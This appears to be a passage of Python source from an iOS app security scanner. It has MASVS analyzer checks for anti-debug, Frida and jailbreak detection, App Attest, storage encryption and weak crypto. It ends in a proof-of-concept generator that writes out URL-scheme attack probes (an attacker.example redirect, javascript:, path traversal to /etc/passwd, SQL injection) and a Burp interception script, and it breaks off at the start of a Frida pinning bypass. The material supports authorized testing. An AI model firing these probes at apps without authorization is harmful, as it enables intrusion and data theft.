    apk_pkg = ((ctx.info_plist or {}).get("CFBundleIdentifier") or "").lower()
    is_sensitive = any(k in apk_pkg for k in ("bank", "wallet", "pay", "finance",
                                                "trading", "exchange", "auth"))
    if is_sensitive and not has_ptrace:
        f.append(Finding(
            id="ios-no-ptrace-anti-debug",
            title="No ptrace(PT_DENY_ATTACH) anti-debug check",
            severity="low", category="MASVS-RESILIENCE",
            description=("Sensitive-domain app does not appear to call "
                         "ptrace(PT_DENY_ATTACH) -- the canonical iOS anti-debug "
                         "technique. Without it, lldb / Frida can attach freely. "
                         "Note: this check is bypassable, but its absence indicates "
                         "no defence-in-depth was attempted."),
            evidence="No ptrace / PT_DENY_ATTACH strings in binary",
            recommendation=("Add a PT_DENY_ATTACH ptrace call in main() or "
                            "+load. Pair with sysctl-based debugger detection. "
                            "Pair with server-side device attestation since "
                            "client-side checks alone can be patched."),
            cwe="CWE-693", masvs="MSTG-RESILIENCE-2", cvss=2.9,
            references=[
                "https://mas.owasp.org/MASTG/iOS/0x06j-Testing-Resiliency-Against-Reverse-Engineering/",
            ],
            confidence="possible", source="vexa",
        ))
    return f


def ios_analyze_no_anti_debug_sysctl(ctx: IOSCtx) -> list:
    """No sysctl-based debugger detection (P_TRACED flag)."""
    f = []
    has_sysctl = _ios_string_present(ctx, "sysctl", "kinfo_proc", "P_TRACED",
                                     "KERN_PROC_PID")
    apk_pkg = ((ctx.info_plist or {}).get("CFBundleIdentifier") or "").lower()
    is_sensitive = any(k in apk_pkg for k in ("bank", "wallet", "pay", "finance"))
    if is_sensitive and not has_sysctl:
        f.append(Finding(
            id="ios-no-sysctl-debugger-check",
            title="No sysctl-based debugger detection",
            severity="info", category="MASVS-RESILIENCE",
            description=("App does not call sysctl with KERN_PROC_PID to inspect "
                         "the P_TRACED flag. This is a complementary check to "
                         "ptrace; together they catch debuggers attached after "
                         "launch as well as before."),
            evidence="No sysctl / P_TRACED references found",
            recommendation=("Implement a periodic sysctl check that exits if "
                            "P_TRACED is set. Note client-side checks are "
                            "bypassable; pair with server-side attestation."),
            cwe="CWE-693", masvs="MSTG-RESILIENCE-2", cvss=0.0,
            references=[
                "https://developer.apple.com/library/archive/qa/qa1361/_index.html",
            ],
            confidence="possible", source="vexa",
        ))
    return f


def ios_analyze_no_simulator_detection(ctx: IOSCtx) -> list:
    """Sensitive apps that don't detect Simulator -- analysts run apps in
    Simulator to hook them; presence of a check is a hardening signal."""
    f = []
    has_sim_check = _ios_string_present(
        ctx, "TARGET_OS_SIMULATOR", "TARGET_IPHONE_SIMULATOR",
        "SIMULATOR_DEVICE_NAME", "isSimulator")
    apk_pkg = ((ctx.info_plist or {}).get("CFBundleIdentifier") or "").lower()
    is_sensitive = any(k in apk_pkg for k in ("bank", "wallet", "pay"))
    if is_sensitive and not has_sim_check:
        f.append(Finding(
            id="ios-no-simulator-detection",
            title="No Simulator detection",
            severity="info", category="MASVS-RESILIENCE",
            description=("Sensitive app does not check whether it's running in "
                         "the Simulator. Analysts use the Simulator to hook UI "
                         "and inspect calls -- detecting Simulator and refusing "
                         "to handle real production data adds defence-in-depth."),
            evidence="No TARGET_OS_SIMULATOR / SIMULATOR_DEVICE_NAME checks found",
            recommendation=("Check for the SIMULATOR_DEVICE_NAME environment "
                            "variable at launch; also TARGET_OS_SIMULATOR conditional. "
                            "If true, hard-fail high-value workflows."),
            cwe="CWE-693", masvs="MSTG-RESILIENCE-2", cvss=0.0,
            references=[
                "https://mas.owasp.org/MASTG/iOS/0x06j-Testing-Resiliency-Against-Reverse-Engineering/",
            ],
            confidence="possible", source="vexa",
        ))
    return f


def ios_analyze_no_frida_detection(ctx: IOSCtx) -> list:
    """No Frida-specific detection strings (e.g. checking /usr/sbin/frida-server)."""
    f = []
    has_frida_check = _ios_string_present(
        ctx, "frida", "Frida", "FRIDA", "gum-js-loop", "frida-agent",
        "27042", "27043")  # Default Frida ports
    apk_pkg = ((ctx.info_plist or {}).get("CFBundleIdentifier") or "").lower()
    is_sensitive = any(k in apk_pkg for k in ("bank", "wallet", "pay", "trading"))
    if is_sensitive and not has_frida_check:
        f.append(Finding(
            id="ios-no-frida-detection",
            title="No Frida-specific detection",
            severity="info", category="MASVS-RESILIENCE",
            description=("Sensitive app contains no Frida-specific strings. Frida "
                         "is the dominant runtime instrumentation tool on iOS; "
                         "detecting it adds defence-in-depth. Look for the "
                         "frida-server process, Frida's TCP ports (27042/27043), "
                         "or the gum-js-loop thread name."),
            evidence="No Frida / frida-server / port-27042 references",
            recommendation=("Implement at least one Frida indicator check at app "
                            "launch: scan running ports, dynamic libraries, or "
                            "thread names. Bypassable individually; effective in "
                            "combination."),
            cwe="CWE-693", masvs="MSTG-RESILIENCE-4", cvss=0.0,
            references=[
                "https://frida.re/",
            ],
            confidence="possible", source="vexa",
        ))
    return f


def ios_analyze_no_jailbreak_check_advanced(ctx: IOSCtx) -> list:
    """Existing ios_analyze_jailbreak_detection covers basic jailbreak; this
    catches apps that have basic checks but miss modern (rootless) jailbreak markers."""
    f = []
    has_basic = _ios_string_present(ctx, "/Applications/Cydia.app",
                                    "/private/var/lib/apt", "MobileSubstrate")
    has_modern = _ios_string_present(
        ctx, "/var/jb", "palera1n", "Dopamine", "checkra1n",
        "/private/preboot/", "rootless", "bootstrap.tar")
    if has_basic and not has_modern:
        f.append(Finding(
            id="ios-jailbreak-check-misses-rootless",
            title="Jailbreak detection misses modern (rootless) jailbreak markers",
            severity="low", category="MASVS-RESILIENCE",
            description=("App contains legacy jailbreak-check strings (Cydia, apt, "
                         "MobileSubstrate) but no markers for modern rootless "
                         "jailbreaks (palera1n, Dopamine, /var/jb). Rootless "
                         "jailbreaks store binaries under /var/jb/ instead of "
                         "/Applications/, evading naive checks."),
            evidence="Legacy markers present; /var/jb / palera1n / Dopamine not detected",
            recommendation=("Add /var/jb/* path checks; check for the "
                            "/var/containers/Bundle/Application path being "
                            "abnormal; detect Dopamine / palera1n daemon names. "
                            "Pair with DeviceCheck / App Attest server-side."),
            cwe="CWE-693", masvs="MSTG-RESILIENCE-1", cvss=3.7,
            references=[
                "https://github.com/palera1n/palera1n",
                "https://github.com/opa334/Dopamine",
            ],
            confidence="possible", source="vexa",
        ))
    return f


def ios_analyze_no_app_attest(ctx: IOSCtx) -> list:
    """Sensitive apps without Apple App Attest / DeviceCheck integration."""
    f = []
    has_attest = _ios_string_present(
        ctx, "DCAppAttestService", "DeviceCheck", "DCDevice",
        "AppAttestService", "generateAssertion")
    apk_pkg = ((ctx.info_plist or {}).get("CFBundleIdentifier") or "").lower()
    is_sensitive = any(k in apk_pkg for k in ("bank", "wallet", "pay", "trading"))
    if is_sensitive and not has_attest:
        f.append(Finding(
            id="ios-no-app-attest",
            title="Sensitive app does not use App Attest",
            severity="medium", category="MASVS-RESILIENCE",
            description=("Sensitive-domain app does not appear to use Apple's "
                         "App Attest API. Without server-side attestation, a "
                         "rooted device or modified app build can complete "
                         "high-value operations if the server trusts the client."),
            evidence="No DCAppAttestService / DeviceCheck references",
            recommendation=("Integrate App Attest. On the backend, require a "
                            "valid attestation for high-value endpoints (login "
                            "from new device, money movement, password change)."),
            cwe="CWE-693", masvs="MSTG-RESILIENCE-2", cvss=4.3,
            references=[
                "https://developer.apple.com/documentation/devicecheck/establishing_your_app_s_integrity",
            ],
            confidence="likely", source="vexa",
        ))
    return f


# ---------- MASVS-STORAGE (iOS) ----------

def ios_analyze_realm_no_encryption(ctx: IOSCtx) -> list:
    """Realm database without encryption."""
    f = []
    has_realm = _ios_string_present(ctx, "RLMRealm", "Realm.Configuration",
                                    "RealmSwift", "io.realm.")
    if not has_realm:
        return f
    has_encryption = _ios_string_present(
        ctx, "encryptionKey", "RLMRealmConfiguration encryptionKey")
    if not has_encryption:
        f.append(Finding(
            id="ios-realm-not-encrypted",
            title="Realm database used without encryption",
            severity="high", category="MASVS-STORAGE",
            description=("Realm DB is referenced but no encryptionKey is set on "
                         "the configuration. Realm DB files are readable from "
                         "/var/mobile/Containers/Data/Application/.../Documents "
                         "on a jailbroken device or extracted iTunes backup."),
            evidence="Realm references present; encryptionKey not detected",
            recommendation=("Generate a 64-byte encryption key, store it in the "
                            "Keychain with kSecAttrAccessibleWhenUnlockedThisDeviceOnly, "
                            "and pass it to Realm.Configuration.encryptionKey on "
                            "every open."),
            cwe="CWE-311", masvs="MSTG-STORAGE-2", cvss=7.4,
            references=[
                "https://www.mongodb.com/docs/realm/sdk/swift/realm-files/encrypt-a-realm/",
            ],
            confidence="likely", source="vexa",
        ))
    return f


def ios_analyze_coredata_no_encryption(ctx: IOSCtx) -> list:
    """Core Data without NSPersistentStoreFileProtectionKey."""
    f = []
    has_coredata = _ios_string_present(
        ctx, "NSPersistentContainer", "NSManagedObjectContext",
        "NSPersistentStoreCoordinator")
    if not has_coredata:
        return f
    has_protection = _ios_string_present(
        ctx, "NSPersistentStoreFileProtectionKey",
        "NSFileProtectionComplete", "NSFileProtectionCompleteUntilFirstUserAuthentication")
    if not has_protection:
        f.append(Finding(
            id="ios-coredata-no-file-protection",
            title="Core Data store without explicit file protection",
            severity="medium", category="MASVS-STORAGE",
            description=("Core Data is used but no NSPersistentStoreFileProtectionKey "
                         "configuration was found. The default file protection on "
                         "iOS is NSFileProtectionCompleteUntilFirstUserAuthentication "
                         "(unlocked once after boot). For sensitive data, "
                         "NSFileProtectionComplete (locked when device is locked) "
                         "is preferable."),
            evidence="Core Data present; NSPersistentStoreFileProtectionKey not set",
            recommendation=("In the persistent store description, set "
                            "NSPersistentStoreFileProtectionKey = NSFileProtectionComplete "
                            "for stores containing sensitive data."),
            cwe="CWE-312", masvs="MSTG-STORAGE-2", cvss=5.0,
            references=[
                "https://developer.apple.com/documentation/uikit/protecting_the_user_s_privacy/encrypting_your_app_s_files",
            ],
            confidence="possible", source="vexa",
        ))
    return f


def ios_analyze_no_screenshot_obfuscation(ctx: IOSCtx) -> list:
    """Sensitive apps that don't blur on backgrounding -- screenshot caches leak info."""
    f = []
    has_obfusc = _ios_string_present(
        ctx, "applicationWillResignActive", "applicationDidEnterBackground",
        "snapshotView", "blurEffect")
    apk_pkg = ((ctx.info_plist or {}).get("CFBundleIdentifier") or "").lower()
    is_sensitive = any(k in apk_pkg for k in ("bank", "wallet", "pay", "health"))
    if is_sensitive and not has_obfusc:
        f.append(Finding(
            id="ios-no-screenshot-obfuscation",
            title="Sensitive app does not obfuscate screen on backgrounding",
            severity="medium", category="MASVS-STORAGE",
            description=("Sensitive app doesn't appear to register "
                         "applicationWillResignActive / applicationDidEnterBackground "
                         "handlers that obfuscate the screen before iOS takes the "
                         "task-switcher snapshot. Snapshots are stored under "
                         "Library/Caches/Snapshots and may persist after app close."),
            evidence="No applicationWillResignActive / blur handler detected",
            recommendation=("In SceneDelegate.sceneWillResignActive (or AppDelegate "
                            "applicationWillResignActive on UIKit), overlay a blur "
                            "view or replace the root view with a generic image. "
                            "Remove on sceneDidBecomeActive."),
            cwe="CWE-200", masvs="MSTG-STORAGE-9", cvss=4.0,
            references=[
                "https://mas.owasp.org/MASTG/iOS/0x06d-Testing-Data-Storage/",
            ],
            confidence="likely", source="vexa",
        ))
    return f


def ios_analyze_caches_directory_sensitive(ctx: IOSCtx) -> list:
    """Common bug: writing to NSCachesDirectory (not backed up to iCloud, but
    can be evicted by the OS). Files there often persist months -- treat as
    persistent storage."""
    f = []
    if _ios_string_present(
            ctx, "NSCachesDirectory", "NSURLCache", "URLCache.shared"):
        # Info-level only -- not a vuln by itself, but a useful audit trigger
        f.append(Finding(
            id="ios-caches-dir-usage",
            title="App writes to Caches directory",
            severity="info", category="MASVS-STORAGE",
            description=("App writes to NSCachesDirectory or uses URLCache. Files "
                         "in Caches are not backed up to iCloud but can persist "
                         "for months. If sensitive responses (API JSON containing "
                         "PII, JWT tokens) are cached there, they survive app "
                         "uninstall / reinstall."),
            evidence="NSCachesDirectory / URLCache references",
            recommendation=("Audit which responses are cached. For sensitive "
                            "endpoints, set NSURLRequest.cachePolicy to "
                            ".reloadIgnoringLocalCacheData and don't write JSON "
                            "containing tokens to NSCachesDirectory."),
            cwe="CWE-525", masvs="MSTG-STORAGE-7", cvss=0.0,
            references=[
                "https://developer.apple.com/library/archive/documentation/FileManagement/Conceptual/FileSystemProgrammingGuide/FileSystemOverview/FileSystemOverview.html",
            ],
            confidence="confirmed", source="vexa",
        ))
    return f


def ios_analyze_documents_directory_world_readable(ctx: IOSCtx) -> list:
    """Documents directory is exposed to iTunes File Sharing if UIFileSharingEnabled=YES."""
    f = []
    info = ctx.info_plist or {}
    uses_file_sharing = info.get("UIFileSharingEnabled") is True
    has_doc_writes = _ios_string_present(
        ctx, "NSDocumentDirectory", "FileManager.default.urls(for: .documentDirectory")
    if uses_file_sharing and has_doc_writes:
        f.append(Finding(
            id="ios-file-sharing-with-document-writes",
            title="UIFileSharingEnabled=YES exposes Documents directory",
            severity="medium", category="MASVS-STORAGE",
            description=("Info.plist sets UIFileSharingEnabled=YES, exposing the "
                         "app's Documents/ to iTunes File Sharing and the Files app. "
                         "App also writes to Documents. Anything stored there is "
                         "user-extractable without jailbreak."),
            evidence=f"UIFileSharingEnabled=YES + Documents writes detected",
            recommendation=("If file sharing isn't a feature, remove UIFileSharingEnabled. "
                            "If it is, separate user-shareable files from app-internal "
                            "state -- store the latter in Library/ApplicationSupport/."),
            cwe="CWE-200", masvs="MSTG-STORAGE-2", cvss=5.4,
            references=[
                "https://developer.apple.com/documentation/bundleresources/information_property_list/uifilesharingenabled",
            ],
            confidence="confirmed", source="vexa",
        ))
    return f


# ---------- MASVS-CRYPTO (iOS) ----------

def ios_analyze_commoncrypto_md5_sha1(ctx: IOSCtx) -> list:
    """CC_MD5 / CC_SHA1 use -- weak hashes."""
    f = []
    if _ios_string_present(ctx, "CC_MD5", "CC_SHA1"):
        f.append(Finding(
            id="ios-cc-weak-hash",
            title="App uses CC_MD5 or CC_SHA1",
            severity="medium", category="MASVS-CRYPTO",
            description=("MD5 and SHA-1 are cryptographically broken for any "
                         "security-relevant use. Both have practical collision "
                         "attacks. Use only for non-security purposes (e.g. "
                         "non-cryptographic hash table keys)."),
            evidence="CC_MD5 / CC_SHA1 strings in binary",
            recommendation=("Migrate to SHA-256 or SHA-3 via CommonCrypto's "
                            "CC_SHA256 (or CryptoKit's SHA256.hash). For password "
                            "storage, use Argon2id or bcrypt."),
            cwe="CWE-327", masvs="MSTG-CRYPTO-4", cvss=5.5,
            references=[
                "https://datatracker.ietf.org/doc/html/rfc6151",
                "https://shattered.io/",
            ],
            confidence="confirmed", source="vexa",
        ))
    return f


def ios_analyze_commoncrypto_des_3des(ctx: IOSCtx) -> list:
    """DES / 3DES use."""
    f = []
    if _ios_string_present(ctx, "kCCAlgorithmDES", "kCCAlgorithm3DES",
                           "kCCAlgorithmTripleDES"):
        f.append(Finding(
            id="ios-cc-des-3des",
            title="App uses DES or 3DES",
            severity="high", category="MASVS-CRYPTO",
            description=("DES is broken (56-bit key); 3DES has a 64-bit block "
                         "size and is vulnerable to Sweet32 attacks for any "
                         "long-lived session. NIST disallowed both for new use "
                         "as of 2024."),
            evidence="kCCAlgorithmDES / kCCAlgorithm3DES detected",
            recommendation=("Migrate to AES-GCM (kCCAlgorithmAES with "
                            "kCCModeGCM in CCCryptorCreateWithMode, or AES.GCM "
                            "in CryptoKit)."),
            cwe="CWE-327", masvs="MSTG-CRYPTO-4", cvss=7.4,
            references=[
                "https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar2.pdf",
                "https://sweet32.info/",
            ],
            confidence="confirmed", source="vexa",
        ))
    return f


def ios_analyze_cipher_ecb_mode(ctx: IOSCtx) -> list:
    """ECB mode -- preserves plaintext patterns."""
    f = []
    if _ios_string_present(ctx, "kCCOptionECBMode"):
        f.append(Finding(
            id="ios-cipher-ecb",
            title="Cipher used in ECB mode",
            severity="high", category="MASVS-CRYPTO",
            description=("ECB mode encrypts each block independently. Identical "
                         "plaintext blocks become identical ciphertext blocks, "
                         "leaking pattern information. The infamous 'Tux penguin' "
                         "image demonstrates the leak."),
            evidence="kCCOptionECBMode detected",
            recommendation=("Use authenticated encryption (AES-GCM via CryptoKit's "
                            "AES.GCM, or CCCryptorCreateWithMode with kCCModeGCM)."),
            cwe="CWE-327", masvs="MSTG-CRYPTO-3", cvss=7.4,
            references=[
                "https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Electronic_codebook_(ECB)",
            ],
            confidence="confirmed", source="vexa",
        ))
    return f


def ios_analyze_predictable_rng(ctx: IOSCtx) -> list:
    """rand() / arc4random for security tokens -- not cryptographically secure."""
    f = []
    has_rand = _ios_string_present(ctx, "_rand", "arc4random")
    has_secure = _ios_string_present(
        ctx, "SecRandomCopyBytes", "kSecRandomDefault")
    has_token_kw = any(k.lower() in (s or "").lower() for s in ctx.binary_strings[:5000]
                       for k in ("token", "session", "csrf"))
    if has_rand and not has_secure:
        f.append(Finding(
            id="ios-predictable-rng",
            title="App uses rand() / arc4random without SecRandomCopyBytes",
            severity="medium", category="MASVS-CRYPTO",
            description=("App calls rand() or arc4random for randomness but does "
                         "not call SecRandomCopyBytes. arc4random is reasonably "
                         "secure for non-cryptographic use, but rand() is not. "
                         "For session tokens, IVs, or keys, the only correct API "
                         "is SecRandomCopyBytes / Apple's CryptoKit secure RNG."),
            evidence="rand / arc4random present; SecRandomCopyBytes not detected",
            recommendation=("Replace random calls used for security with "
                            "SecRandomCopyBytes(kSecRandomDefault, length, &buffer). "
                            "In Swift, use SystemRandomNumberGenerator (CSPRNG) "
                            "or AES.GCM.Nonce()."),
            cwe="CWE-338", masvs="MSTG-CRYPTO-6", cvss=5.5,
            references=[
                "https://developer.apple.com/documentation/security/1399291-secrandomcopybytes",
            ],
            confidence="possible", source="vexa",
        ))
    return f


# ---------- MASVS-CODE (iOS) ----------

def ios_analyze_debug_dylibs(ctx: IOSCtx) -> list:
    """Debug-only dylibs left in release build."""
    f = []
    files = ctx.files or []
    debug_libs = [fn for fn in files if any(d in fn.lower() for d in (
        "libpod_debug.dylib", "_debug.dylib", "/debug/", "_test.dylib"))]
    if debug_libs:
        f.append(Finding(
            id="ios-debug-dylibs-bundled",
            title=f"Debug-only dylib(s) bundled in release build",
            severity="medium", category="MASVS-CODE",
            description=("App bundle contains dylibs with names suggesting debug "
                         "or test variants. Debug builds typically have weaker "
                         "compiler optimizations, exposed symbols, and assertion "
                         "code that leaks state."),
            evidence=f"Debug dylibs: {debug_libs[:3]}",
            recommendation=("Audit the build configuration. Release builds should "
                            "link only release variants. Use Build Configurations "
                            "in Xcode to gate per-environment dylibs."),
            cwe="CWE-489", masvs="MSTG-CODE-2", cvss=4.0,
            references=[
                "https://developer.apple.com/documentation/xcode/build-system",
            ],
            confidence="likely", source="vexa",
        ))
    return f


def ios_analyze_embedded_provisioning_profile(ctx: IOSCtx) -> list:
    """Embedded.mobileprovision with development cert / wildcard entitlements."""
    f = []
    mp = ctx.mobileprovision or {}
    if not mp:
        return f
    is_dev = mp.get("ProvisionsAllDevices") is True or \
             "ProvisionedDevices" in mp or \
             mp.get("Entitlements", {}).get("get-task-allow") is True
    if is_dev:
        f.append(Finding(
            id="ios-dev-provisioning-profile",
            title="App ships with development provisioning profile",
            severity="high", category="MASVS-CODE",
            description=("embedded.mobileprovision is a development profile (has "
                         "ProvisionedDevices or get-task-allow=true). Development "
                         "builds permit debugger attachment. If this APK reached "
                         "users, a build pipeline error promoted a dev binary to "
                         "release."),
            evidence=("get-task-allow=true" if mp.get("Entitlements", {}).get("get-task-allow") is True
                      else "ProvisionedDevices list present"),
            recommendation=("Investigate the build pipeline. App Store / Enterprise "
                            "builds must use distribution profiles with "
                            "get-task-allow=false."),
            cwe="CWE-489", masvs="MSTG-CODE-2", cvss=7.4,
            references=[
                "https://developer.apple.com/documentation/security/notarizing_macos_software_before_distribution/resolving_common_notarization_issues",
            ],
            confidence="confirmed", source="vexa",
        ))
    return f


def ios_analyze_third_party_sdks(ctx: IOSCtx) -> list:
    """Inventory of detected third-party SDKs (info-only -- useful audit context)."""
    f = []
    sdk_markers = {
        "Firebase":            ["FIRApp", "FirebaseCore", "GoogleService-Info.plist"],
        "Facebook":            ["FBSDKCoreKit", "FacebookAppID"],
        "AppsFlyer":           ["AppsFlyerLib"],
        "Adjust":              ["Adjust", "AdjustSdk"],
        "Mixpanel":            ["Mixpanel", "MPNetwork"],
        "Amplitude":           ["Amplitude", "AMPClient"],
        "Branch":              ["BranchSDK", "BNCNetworkService"],
        "Sentry":              ["SentrySDK", "SentryHub"],
        "Crashlytics":         ["FIRCrashlytics", "Fabric"],
        "Stripe":              ["STPAPIClient", "StripeAPI"],
        "PayPal":              ["PayPalSDK", "PPHttpClient"],
        "OneSignal":           ["OneSignal", "OSPlayer"],
    }
    detected = []
    for sdk, markers in sdk_markers.items():
        if _ios_string_present(ctx, *markers):
            detected.append(sdk)
    if detected:
        f.append(Finding(
            id="ios-third-party-sdks",
            title=f"Third-party SDKs detected: {len(detected)}",
            severity="info", category="MASVS-CODE",
            description=("Each third-party SDK expands the attack surface and may "
                         "send data to its own servers. Audit each SDK's data-"
                         "collection practices against your privacy policy and "
                         "applicable regulations (GDPR, CCPA, COPPA)."),
            evidence=f"SDKs: {', '.join(detected)}",
            recommendation=("Maintain an SDK inventory. For each, document what "
                            "data is collected, where it is sent, and the "
                            "consent mechanism. Audit on every dependency update."),
            cwe="CWE-829", masvs="MSTG-CODE-1", cvss=0.0,
            references=[
                "https://developer.apple.com/app-store/app-privacy-details/",
            ],
            confidence="confirmed", source="vexa",
        ))
    return f


def ios_analyze_no_obfuscation(ctx: IOSCtx) -> list:
    """No obfuscation detected -- common Objective-C class/method names visible."""
    f = []
    apk_pkg = ((ctx.info_plist or {}).get("CFBundleIdentifier") or "").lower()
    is_sensitive = any(k in apk_pkg for k in ("bank", "wallet", "pay", "trading"))
    if not is_sensitive:
        return f
    # Heuristic: count meaningful class/method names. If many semantically named
    # symbols exist, it's not obfuscated.
    sensitive_methods = sum(1 for s in ctx.binary_strings if any(p in s.lower()
        for p in ("login", "password", "decrypt", "encrypt", "token", "secret")))
    if sensitive_methods > 10:
        f.append(Finding(
            id="ios-no-obfuscation",
            title="Sensitive app appears unobfuscated",
            severity="low", category="MASVS-RESILIENCE",
            description=(f"Sensitive-domain app contains {sensitive_methods}+ "
                         "method/class names with security-relevant words. No "
                         "obfuscation or symbol stripping was applied. Reverse-"
                         "engineering is significantly easier."),
            evidence=f"~{sensitive_methods} security-related symbol names visible",
            recommendation=("Strip symbols at build time (Xcode build setting "
                            "STRIP_INSTALLED_PRODUCT=YES). Consider an Objective-C "
                            "/ Swift obfuscator for class names. Note: obfuscation "
                            "is a deterrent, not a security control."),
            cwe="CWE-693", masvs="MSTG-RESILIENCE-9", cvss=2.7,
            references=[
                "https://mas.owasp.org/MASTG/iOS/0x06j-Testing-Resiliency-Against-Reverse-Engineering/",
            ],
            confidence="possible", source="vexa",
        ))
    return f


# =============================================================================
# Registration list for iOS Path-2 batch
# =============================================================================
IOS_EXTENDED_ANALYZERS_2 = [
    # MASVS-AUTH (5)
    ("ios-local-auth-passcode-fallback",   ios_analyze_local_auth_weak_policy),
    ("ios-keychain-no-biometric-acl",      ios_analyze_keychain_no_biometric_acl),
    ("ios-userdefaults-sensitive-keys",    ios_analyze_password_in_userdefaults),
    ("ios-jwt-alg-none",                   ios_analyze_jwt_alg_none),
    ("ios-oauth-no-state-or-pkce",         ios_analyze_oauth_state_missing),
    # MASVS-NETWORK (6)
    ("ios-ats-stale-exceptions",           ios_analyze_ats_specific_exceptions),
    ("ios-ats-weak-tls",                   ios_analyze_ats_min_tls_version),
    ("ios-nsurlconnection-deprecated",     ios_analyze_nsurl_connection_deprecated),
    ("ios-cookie-no-secure",               ios_analyze_cookie_no_secure_flag),
    ("ios-custom-trust-bypass",            ios_analyze_custom_hostname_verifier),
    ("ios-cleartext-websocket",            ios_analyze_websocket_cleartext),
    # MASVS-PLATFORM (5)
    ("ios-wkwebview-js-bridge",            ios_analyze_wkwebview_javascript_bridge),
    ("ios-wkwebview-universal-access",     ios_analyze_wkwebview_universal_access),
    ("ios-url-scheme-no-source-check",     ios_analyze_url_scheme_no_validation),
    ("ios-app-extensions-present",         ios_analyze_app_extension_exposed),
    ("ios-app-groups-present",             ios_analyze_app_groups),
    # MASVS-RESILIENCE (6)
    ("ios-no-ptrace-anti-debug",           ios_analyze_no_anti_debug_ptrace),
    ("ios-no-sysctl-debugger-check",       ios_analyze_no_anti_debug_sysctl),
    ("ios-no-simulator-detection",         ios_analyze_no_simulator_detection),
    ("ios-no-frida-detection",             ios_analyze_no_frida_detection),
    ("ios-jailbreak-check-misses-rootless", ios_analyze_no_jailbreak_check_advanced),
    ("ios-no-app-attest",                  ios_analyze_no_app_attest),
    # MASVS-STORAGE (5)
    ("ios-realm-not-encrypted",            ios_analyze_realm_no_encryption),
    ("ios-coredata-no-file-protection",    ios_analyze_coredata_no_encryption),
    ("ios-no-screenshot-obfuscation",      ios_analyze_no_screenshot_obfuscation),
    ("ios-caches-dir-usage",               ios_analyze_caches_directory_sensitive),
    ("ios-file-sharing-with-document-writes", ios_analyze_documents_directory_world_readable),
    # MASVS-CRYPTO (4)
    ("ios-cc-weak-hash",                   ios_analyze_commoncrypto_md5_sha1),
    ("ios-cc-des-3des",                    ios_analyze_commoncrypto_des_3des),
    ("ios-cipher-ecb",                     ios_analyze_cipher_ecb_mode),
    ("ios-predictable-rng",                ios_analyze_predictable_rng),
    # MASVS-CODE (4)
    ("ios-debug-dylibs-bundled",           ios_analyze_debug_dylibs),
    ("ios-dev-provisioning-profile",       ios_analyze_embedded_provisioning_profile),
    ("ios-third-party-sdks",               ios_analyze_third_party_sdks),
    ("ios-no-obfuscation",                 ios_analyze_no_obfuscation),
]


IOS_ANALYZERS = [
    ("metadata",          ios_analyze_metadata),
    ("ats",               ios_analyze_ats),
    ("url-schemes",       ios_analyze_url_schemes),
    ("universal-links",   ios_analyze_universal_links),
    ("entitlements",      ios_analyze_entitlements),
    ("secrets",           ios_analyze_secrets),
    ("crypto",            ios_analyze_weak_crypto),
    ("pinning",           ios_analyze_pinning),
    ("jailbreak-detect",  ios_analyze_jailbreak_detection),
    ("query-schemes",     ios_analyze_query_schemes),
    ("privacy",           ios_analyze_privacy_strings),
    ("binary-prot",       ios_analyze_binary_protections),
    ("pasteboard",        ios_analyze_pasteboard),
    ("uiwebview",         ios_analyze_uiwebview),
    ("keychain-access",   ios_analyze_keychain_accessibility),
] + IOS_EXTENDED_ANALYZERS_2


def generate_ios_pocs(report: dict) -> list:
    """Generate iOS-specific PoCs from a parsed iOS report."""
    pkg = report.get("metadata", {}).get("package") or "<bundle>"
    extras = report.get("extras", {})
    findings = report.get("findings", [])
    ids = {f["id"] for f in findings}
    pocs = []

    schemes = extras.get("url_schemes") or []
    if schemes:
        rows = "\n".join(f'    <li><a href="{html.escape(s)}://test">{html.escape(s)}://test</a></li>' for s in schemes[:10])
        first = html.escape(schemes[0])
        poc_html = f"""<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>Vexa iOS URL Scheme PoC -- {html.escape(pkg)}</title>
<style>body{{font:15px/1.5 system-ui,sans-serif;max-width:720px;margin:40px auto;padding:20px;background:#0d1117;color:#c9d1d9}}
h1,h2{{color:#58a6ff}} a{{color:#58a6ff;display:inline-block;padding:6px 0}} li{{margin:4px 0}}
code{{background:#161b22;padding:2px 6px;border-radius:3px;color:#ff7b72}}</style></head>
<body><h1>iOS URL Scheme PoC</h1>
<p>Target bundle: <code>{html.escape(pkg)}</code></p>
<h2>Bare scheme triggers</h2>
<ul>
{rows}
</ul>
<h2>Smuggled URL parameters</h2>
<ul>
  <li><a href="{first}://x?next=https://attacker.example/">?next= injection</a></li>
  <li><a href="{first}://x?url=javascript:alert(1)">javascript: scheme</a></li>
  <li><a href="{first}://x?file=../../etc/passwd">path-traversal probe</a></li>
  <li><a href="{first}://x?id=' OR '1'='1">SQL-injection probe</a></li>
</ul>
<h2>Manual test</h2>
<p>Run: <code>xcrun simctl openurl booted "{first}://path"</code></p>
</body></html>"""
        pocs.append(PoC(
            id="poc-ios-url-schemes", finding_id="ios-custom-url-schemes",
            title=f"iOS URL scheme PoC ({len(schemes)} scheme(s))", severity="high",
            why="Custom schemes are unauthenticated by iOS - any app can register them.",
            impact="Pre-auth deep link entry; WebView URL injection if scheme handler passes URL into WKWebView.",
            artifacts=[PoCArtifact("poc.html", poc_html, "html")],
            confidence="needs-device",
        ))

    # Secret validators (handles both Android and iOS secret IDs)
    pocs.extend(poc_secrets(findings))

    if any(i in ids for i in ("ios-ats-arbitrary", "ios-ats-domain-exceptions",
                              "ios-ats-webview-arbitrary", "ios-no-pinning")):
        sh = """#!/bin/bash
echo "[*] Vexa iOS MITM setup"
echo "[1] Connect iOS device to same WiFi as your machine"
echo "[2] Run Burp Suite on your machine, port 8080, bound to all interfaces"
echo "[3] On iOS: Settings -> Wi-Fi -> network -> Configure Proxy -> Manual"
echo "    server=<your-ip> port=8080"
echo "[4] Visit http://burp on Safari, install Burp CA profile"
echo "[5] Settings -> General -> About -> Certificate Trust Settings"
echo "    enable Burp CA toggle"
echo "[6] Launch app and exercise its features"
echo "[note] If pinning is in place, combine with the Frida bypass"
"""
        pocs.append(PoC(
            id="poc-ios-mitm", finding_id="ios-ats-arbitrary",
            title="iOS MITM setup", severity="high",
            why="ATS misconfig or absent pinning permits interception with Burp.",
            impact="Full traffic interception/modification.",
            artifacts=[PoCArtifact("ios_mitm_setup.sh", sh, "sh")],
            confidence="needs-device",
        ))

    # Universal Frida SSL pinning bypass for iOS
    frida_ios = f"""// Vexa iOS SSL pinning bypass (Frida)
